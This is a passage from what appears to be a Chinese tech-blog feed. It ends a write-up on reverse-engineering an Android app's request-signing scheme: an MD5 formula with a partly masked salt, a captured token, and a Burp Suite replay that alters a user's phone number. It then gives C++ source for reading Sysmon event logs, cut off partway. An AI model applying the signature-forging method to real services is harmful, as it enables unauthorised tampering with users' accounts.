类。</p><p>在这个类中发现一些特征极可能就是我们要找的：</p><ul><li>import 中的 okhttp3 是用于处理 HTTP 请求的</li><li>函数【<code>public Response intercept(Chain chain)</code>】中涉及了 POST/GET 请求下关于 token 和 signature 的处理逻辑</li></ul><p><img src="33.jpg"></p><h4 id="B-2-4-签名算法"><a href="#B-2-4-签名算法" class="headerlink" title="B.2.4. 签名算法"></a>B.2.4. 签名算法</h4><p>分析这块代码可知，signature 一共有三种算法：</p><ul><li>POST 请求有两种算法</li><li>GET 请求有一种算法（暂时不关注，下面就不分析了）</li></ul><p><img src="34.jpg"></p><p>针对 POST 方法的 signature 的两种具体算法分析如下：</p><ul><li><code>signature = RSA(rsakey, token + params + millis)</code>   （暂时不关注，不再详细分析）</li><li><code>signature = MD5("params" + params + "DnWX83SksBoctyoVDmEkyEDuzB6i2RUyWY4A9m**********xxxhin31rzDU")</code></li></ul><p><img src="35.jpg"></p><p><img src="36.jpg"></p><p>回到最开始的抓包请求：</p><ul><li>Method: POST</li><li>URL： <code>/xxx-abService/ab/employee/phone</code></li><li>token: 4E07B642-5209-CE11-52AB-3326EE2E0899</li><li>params: <code>{"phoneNumber":"***********","userName":"******"}</code></li><li>signature: da7ba0142b4a8d746147dd386c021725</li></ul><p>随便找一个 MD5 计算工具（如 <a href="http://www.jsons.cn/md5/s/">http://www.jsons.cn/md5/s/</a> ），代入前面的公式计算，若得到相同的 signature，说明成功得到 signature 的签名算法，可以实现中间人攻击。</p><blockquote><p>注：测试发现 signature 必须全小写，大写不能通过验证。</p></blockquote><p><img src="37.jpg"></p><p><img src="38.jpg"></p><h4 id="B-2-5-实现中间人改包"><a href="#B-2-5-实现中间人改包" class="headerlink" title="B.2.5. 实现中间人改包"></a>B.2.5. 实现中间人改包</h4><ul><li>修改 params 为 <code>{"phoneNumber":"00000000000","userName":"******"}</code></li><li>计算 signature 签名值为 993fee1a8f4ca2a54fbc5ec589ede5bd</li><li>通过 Burp Suite 发送请求，修改个人信息成功。</li></ul><p><img src="39.jpg"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
            <tag> 反编译 </tag>
            
            <tag> 壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取 Sysmon 事件信息</title>
      <link href="/lang/getsysmon/"/>
      <url>/lang/getsysmon/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>Sysmon 官方文档： <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></li></ul><blockquote><p><a href="../../download/get_sysmon_event.zip">get_sysmon_event.exe 下载</a></p></blockquote><h2 id="C-源码"><a href="#C-源码" class="headerlink" title="C++ 源码"></a>C++ 源码</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/************************************************************************************************************* * get_sysmon_event.cpp *              * Sysmon 事件查询脚本，使用方法: *   ./get_sysmon_event.exe  *                          -limit 100                              : 一次查询的数量上限（可选，默认值100） *                          -id 1                                   : 事件类型（可选，默认值1） *                          -ts '2019-12-16T00:00:00.000000000Z'    : 查询开始时间（可选，默认无此条件） *                          -te '2019-12-16T08:00:00.000000000Z'    : 查询结束时间（可选，默认值为当前时间） *   *  ./get_sysmon_event.exe  *                          -limit 100   : 一次查询的数量上限（可选，默认值100） *                          -query str   : 查询字符串，语法形式形如： *    "Event/System[TimeCreated[@SystemTime&lt;'2019-12-16T08:00:00.000000000Z'] and TimeCreated[@SystemTime>'2019-12-05T00:00:00.000000000Z'] and EventID=3]" *  *************************************************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sddl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;locale.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winevt.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib, "wevtapi.lib") </span><span class="token comment" spellcheck="true">// winevt.h 库文件</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENTID_PROCESS_CREATE 1    </span><span class="token comment" spellcheck="true">// Sysmon事件ID: 进程创建</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENTID_NETWORK_CONNECT 3   </span><span class="token comment" spellcheck="true">// Sysmon事件ID: 网络连接</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_CHANNEL L"Microsoft-Windows-Sysmon/Operational"   </span><span class="token comment" spellcheck="true">// Sysmon事件管道名称</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_QUERY L"Event/System[EventID=1]"  </span><span class="token comment" spellcheck="true">// 系统事件查询条件语句</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_ITERATOR 10           </span><span class="token comment" spellcheck="true">// 单次迭代事件的个数</span><span class="token macro property">#<span class="token directive keyword">define</span> EVENT_LIMIT 50              </span><span class="token comment" spellcheck="true">// 默认查询返回的事件数量上限</span><span class="token keyword">static</span> DWORD _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> EVENT_LIMIT<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 当前查询返回的事件数量上限</span>bool <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 检测字符串是否为空</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>LPWSTR <span class="token function">toLPWSTR</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// ASCII字符 -> 宽字符</span><span class="token keyword">void</span> <span class="token function">delUnASCII</span><span class="token punctuation">(</span>LPWSTR wstr<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 把非 ASCII 字符替换成 ?</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 根据脚本入参生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> eventId<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> startTime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 生成系统事件查询条件语句</span>DWORD <span class="token function">printEvents</span><span class="token punctuation">(</span>EVT_HANDLE hEvents<span class="token punctuation">,</span> DWORD limit<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 打印查询得到的系统事件列表</span>DWORD <span class="token function">printEvent</span><span class="token punctuation">(</span>EVT_HANDLE hEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印单个系统事件</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    LPWSTR channel <span class="token operator">=</span> EVENT_CHANNEL<span class="token punctuation">;</span>    LPWSTR evtQuery <span class="token operator">=</span> <span class="token function">toEvtQuery</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    EVT_HANDLE hEvents <span class="token operator">=</span> <span class="token function">EvtQuery</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> channel<span class="token punctuation">,</span> evtQuery<span class="token punctuation">,</span> EvtQueryChannelPath <span class="token operator">|</span> EvtQueryReverseDirection<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> hEvents<span class="token punctuation">)</span> <span class="token punctuation">{</span>        DWORD errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ERROR_EVT_CHANNEL_NOT_FOUND <span class="token operator">==</span> errId<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] The channel was not found: %s\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ERROR_EVT_INVALID_QUERY <span class="token operator">==</span> errId<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] The query is invalid: %s\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> evtQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtQuery failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printEvents</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">,</span> _evtLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">EvtClose</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// system("pause");</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 根据脚本入参生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> eventId <span class="token operator">=</span> EVENTID_PROCESS_CREATE<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> startTime <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> endTime <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> query <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-limit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            _evtLimit <span class="token operator">=</span> <span class="token punctuation">(</span>_evtLimit <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">?</span> EVENT_LIMIT <span class="token punctuation">:</span> _evtLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            eventId <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            eventId <span class="token operator">=</span> <span class="token punctuation">(</span>eventId <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> EVENTID_PROCESS_CREATE <span class="token punctuation">:</span> eventId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-ts"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            startTime <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-te"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            endTime <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-query"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            query <span class="token operator">=</span> argv<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">toLPWSTR</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token function">toEvtQuery</span><span class="token punctuation">(</span>eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 生成系统事件查询条件语句</span>LPWSTR <span class="token function">toEvtQuery</span><span class="token punctuation">(</span><span class="token keyword">int</span> eventId<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> startTime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> endTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> evtQuery <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime>'%s'] and TimeCreated[@SystemTime&lt;'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>startTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime>'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>endTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        evtQuery <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">26</span> <span class="token operator">+</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">,</span> <span class="token string">"Event/System[EventID=%d and TimeCreated[@SystemTime&lt;'%s']]\0"</span><span class="token punctuation">,</span> eventId<span class="token punctuation">,</span> endTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">toLPWSTR</span><span class="token punctuation">(</span>evtQuery<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印查询得到的系统事件列表</span>DWORD <span class="token function">printEvents</span><span class="token punctuation">(</span>EVT_HANDLE hEvents<span class="token punctuation">,</span> DWORD limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    DWORD _iterNum <span class="token operator">=</span> <span class="token punctuation">(</span>EVENT_ITERATOR <span class="token operator">&lt;=</span> limit <span class="token operator">?</span> EVENT_ITERATOR <span class="token punctuation">:</span> limit<span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 累计迭代获得的事件数</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cnt <span class="token operator">&lt;</span> limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>        DWORD num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 本次迭代获得的事件数</span>        EVT_HANDLE<span class="token operator">*</span> evtCache <span class="token operator">=</span> new EVT_HANDLE<span class="token punctuation">[</span>_iterNum<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 缓存</span>        <span class="token comment" spellcheck="true">// 提取事件列表</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">EvtNext</span><span class="token punctuation">(</span>hEvents<span class="token punctuation">,</span> _iterNum<span class="token punctuation">,</span> evtCache<span class="token punctuation">,</span> INFINITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">!=</span> ERROR_NO_MORE_ITEMS<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[Error %lu] EvtNext failed.\n"</span><span class="token punctuation">,</span> errId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            delete<span class="token punctuation">[</span><span class="token punctuation">]</span> evtCache<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 迭代打印</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> cnt <span class="token operator">&lt;</span> limit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> cnt<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errId <span class="token operator">=</span> <span class="token function">printEvent</span><span class="token punctuation">(</span>evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">==</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">EvtClose</span><span class="token punctuation">(</span>evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                evtCache<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        delete<span class="token punctuation">[</span><span class="token punctuation">]</span> evtCache<span class="token punctuation">;</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> errId<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 打印单个系统事件 *&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">  &lt;System>    &lt;Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>    &lt;EventID>1&lt;/EventID>    &lt;Version>5&lt;/Version>    &lt;Level>4&lt;/Level>    &lt;Task>1&lt;/Task>    &lt;Opcode>0&lt;/Opcode>    &lt;Keywords>0x8000000000000000&lt;/Keywords>    &lt;TimeCreated SystemTime="2019-12-17T10:26:56.242881800Z"/>    &lt;EventRecordID>50077&lt;/EventRecordID>    &lt;Correlation/>    &lt;Execution ProcessID="1280" ThreadID="1904"/>    &lt;Channel>Microsoft-Windows-Sysmon/Operational&lt;/Channel>    &lt;Computer>WIN-S1B6IAK3UN2&lt;/Computer>    &lt;Security UserID="S-1-5-18"/>  &lt;/System>  &lt;EventData>    &lt;Data Name="RuleName"/>    &lt;Data Name="UtcTime">2019-12-17 10:26:56.242&lt;/Data>    &lt;Data Name="ProcessGuid">{68E7DA22-AD70-5DF8-0000-0010428D1D01}&lt;/Data>    &lt;Data Name="ProcessId">16256&lt;/Data>    &lt;Data Name="Image">C:\\Program Files\\Sublime Text 3\\sublime_text.exe&lt;/Data>    &lt;Data Name="FileVersion">3188&lt;/Data>    &lt;Data Name="Description">Sublime Text&lt;/Data>    &lt;Data Name="Product">Sublime Text&lt;/Data>    &lt;Data Name="Company">Sublime HQ Pty Ltd&lt;/Data>    &lt;Data Name="OriginalFileName">sublime_text.exe&lt;/Data>    &lt;Data Name="CommandLine">"/C/Program Files/Sublime Text 3/sublime_text.exe" "--crawl" "14516:crawl:11"&lt;/Data>    &lt;Data Name="CurrentDirectory">C:\\Program Files\\Sublime Text 3\\&lt;/Data>    &lt;Data Name="User">WIN-S1B6IAK3UN2\\Administrator&lt;/Data>    &lt;Data Name="LogonGuid">{68E7DA22-383A-5DF8-0000-0020CBFF0200}&lt;/Data>    &lt;Data Name="LogonId">0x2ffcb&lt;/Data>    &lt;Data Name="TerminalSessionId">2&lt;/Data>    &lt;Data Name="IntegrityLevel">High&lt;/Data>    &lt;Data Name="Hashes">SHA256=450AD9A507403C5A3BA42DC6E1910E84E886200AFD190BF4B0B5B95FC066F7E1&lt;/Data>    &lt;Data Name="ParentProcessGuid">{68E7DA22-A908-5DF8-0000-0010A0B40F01}&lt;/Data>    &lt;Data Name="ParentProcessId">14516&lt;/Data>    &lt;Data Name="ParentImage">C:\\Program Files\\Sublime Text 3\\sublime_text.exe&lt;/Data>    &lt;Data Name="ParentCommandLine">"C:\\Program Files\\Sublime Text 3\\sublime_text.exe"&lt;/Data>  &lt;/EventData>&lt;/Event> */</span>DWORD <span class="token function">printEvent</span><span class="token punctuation">(</span>EVT_HANDLE hEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    DWORD dwBufferSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwBufferUsed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwPropertyCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    LPWSTR pRenderedContent <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">EvtRender</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hEvent<span class="token punctuation">,</span> EvtRenderEventXml<span class="token punctuation">,</span> dwBufferSize<span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBufferUsed<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwPropertyCount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>errId <span class="token operator">==</span> ERROR_INSUFFICIENT_BUFFER<span class="token punctuation">)</span> <span class="token punctuation">{</span>            dwBufferSize <span class="token operator">=</span> dwBufferUsed<span class="token punctuation">;</span>            pRenderedContent <span class="token operator">=</span> <span class="token punctuation">(</span>LPWSTR<span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>dwBufferSize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pRenderedContent<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">EvtRender</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hEvent<span class="token punctuation">,</span> EvtRenderEventXml<span class="token punctuation">,</span> dwBufferSize<span class="token punctuation">,</span> pRenderedContent<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBufferUsed<span class="token punctuation">,</span> <span class="token 